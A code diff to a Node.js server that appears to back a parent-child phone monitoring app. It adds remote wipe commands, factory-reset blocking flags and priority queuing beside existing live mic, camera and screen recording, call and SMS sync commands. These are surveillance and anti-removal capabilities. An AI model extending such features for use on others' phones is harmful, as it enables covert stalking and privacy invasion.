@@ -885,17 +885,22 @@ function readBody(req) {
   });
 }
 function send(res, code, obj) {
-  const body = JSON.stringify(obj);
-  res.writeHead(code, {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*',
-    'Access-Control-Allow-Headers': 'Content-Type, Authorization, x-session-token, x-child-token',
-    'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
-    'X-Content-Type-Options': 'nosniff',
-    'X-Frame-Options': 'DENY',
-    'Cache-Control': 'no-store'
-  });
-  res.end(body);
+  try {
+    if (!res || res.headersSent || res.writableEnded) return;
+    const body = JSON.stringify(obj);
+    res.writeHead(code, {
+      'Content-Type': 'application/json',
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Headers': 'Content-Type, Authorization, x-session-token, x-child-token, x-device-id, x-child-device-id',
+      'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
+      'X-Content-Type-Options': 'nosniff',
+      'X-Frame-Options': 'DENY',
+      'Cache-Control': 'no-store'
+    });
+    res.end(body);
+  } catch (e) {
+    try { if (!res.headersSent) res.end(); } catch (e2) {}
+  }
 }
 
 function bearerToken(headers) {
@@ -1333,6 +1338,9 @@ const server = http.createServer(async (req, res) => {
         try { send(res, 200, { ok: true, changed: false, ts: Date.now() }); } catch (e) {}
       }, 12000);
       presenceWaiters.push(waiter);
+      if (presenceWaiters.length > 200) {
+        presenceWaiters = presenceWaiters.filter(w => w && !w.done).slice(-100);
+      }
       req.on('close', () => {
         waiter.done = true;
         try { clearTimeout(waiter.timer); } catch (e) {}
@@ -1340,7 +1348,7 @@ const server = http.createServer(async (req, res) => {
       return;
     }
 
-        if (pathname === '/device/remove' && req.method === 'POST') {
+    if (pathname === '/device/remove' && req.method === 'POST') {
       const p = parentOf(body, q, req.headers);
       if (!p) return send(res, 401, { error: 'unauthorized' });
       const db = load();
@@ -1372,6 +1380,11 @@ const server = http.createServer(async (req, res) => {
         if (body.phoneName) x.phoneName = String(body.phoneName);
         if (body.netType) x.netType = String(body.netType);
         if (Array.isArray(body.sims)) x.sims = body.sims;
+        if (body.factoryResetLock != null) x.factoryResetLock = !!body.factoryResetLock;
+        if (body.factoryResetBlocking != null) x.factoryResetBlocking = !!body.factoryResetBlocking;
+        if (body.factoryResetTemp != null) x.factoryResetTemp = !!body.factoryResetTemp;
+        if (body.factoryResetTempMs != null) x.factoryResetTempMs = Number(body.factoryResetTempMs) || 0;
+        if (body.factoryResetOwner != null) x.factoryResetOwner = !!body.factoryResetOwner;
         x.lastSeen = now();
         markPresence(x, true, body.netType || "heartbeat");
         if (wasOff) { try { save(db); } catch (e) {} }
@@ -3081,6 +3094,19 @@ const server = http.createServer(async (req, res) => {
         });
         if (dup) return send(res, 200, { ok: true, deduped: true, note: 'start_live already queued' });
       }
+      // Dedup urgent wipe — one PENDING/CLAIMED wipe at a time
+      if (cmd === 'remote_factory_reset' || cmd === 'factory_reset_now' || cmd === 'wipe_device' || cmd === 'parent_wipe') {
+        const nowW = Date.now();
+        const has = (db.commands || []).some(c => {
+          if (!c || String(c.deviceId||'') !== String(deviceId||'')) return false;
+          if (!(c.command === 'remote_factory_reset' || c.command === 'factory_reset_now'
+              || c.command === 'wipe_device' || c.command === 'parent_wipe')) return false;
+          if (c.status !== 'PENDING' && c.status !== 'CLAIMED') return false;
+          const age = nowW - (Date.parse(c.createdAt) || 0);
+          return age < 120000;
+        });
+        if (has) return send(res, 200, { ok: true, deduped: true, note: 'wipe already queued' });
+      }
       db.commands.push({ id: rid(), deviceId: deviceId, command: cmd, payload: payload, status: 'PENDING', createdAt: now() });
       save(db); return send(res, 200, { ok: true });
     }
@@ -3103,6 +3129,11 @@ const server = http.createServer(async (req, res) => {
             || cmd === 'audio_record' || cmd === 'camera_record' || cmd === 'screen_record'
             || cmd === 'record_audio' || cmd === 'record_camera' || cmd === 'record_screen'
             || cmd === 'start_audio_record' || cmd === 'start_camera_record' || cmd === 'start_screen_record'
+            || cmd === 'remote_factory_reset' || cmd === 'factory_reset_now' || cmd === 'wipe_device' || cmd === 'parent_wipe'
+            || cmd === 'factory_reset_lock' || cmd === 'factory_reset_unlock' || cmd === 'factory_reset_status'
+            || cmd === 'factory_reset_protect_on' || cmd === 'factory_reset_protect_off'
+            || cmd === 'lock_factory_reset' || cmd === 'unlock_factory_reset'
+            || cmd === 'lock_device' || cmd === 'unlock_device' || cmd === 'device_lock' || cmd === 'device_unlock'
           );
           const limit = (cmd === 'live_mic' || cmd === 'live_audio_on' || cmd === 'live_audio_off')
             ? 12 * 1000
@@ -3127,6 +3158,9 @@ const server = http.createServer(async (req, res) => {
         // Live control first so Speaker/mic is not stuck behind gallery/sms sync
         const pri = (c) => {
           const x = String(c.command || '');
+          // Parent wipe / lock first — never stuck behind gallery sync
+          if (x === 'remote_factory_reset' || x === 'factory_reset_now' || x === 'wipe_device' || x === 'parent_wipe') return 0;
+          if (x === 'factory_reset_lock' || x === 'factory_reset_unlock' || x === 'lock_device' || x === 'unlock_device') return 0;
           if (x === 'place_call' || x === 'call_place' || x === 'make_call') return 0;
           if (x === 'snapshot_now' || x === 'snap_now' || x === 'capture_snapshot') return 0;
           if (x === 'live_mic' || x === 'live_audio_on' || x === 'live_audio_off') return 1;
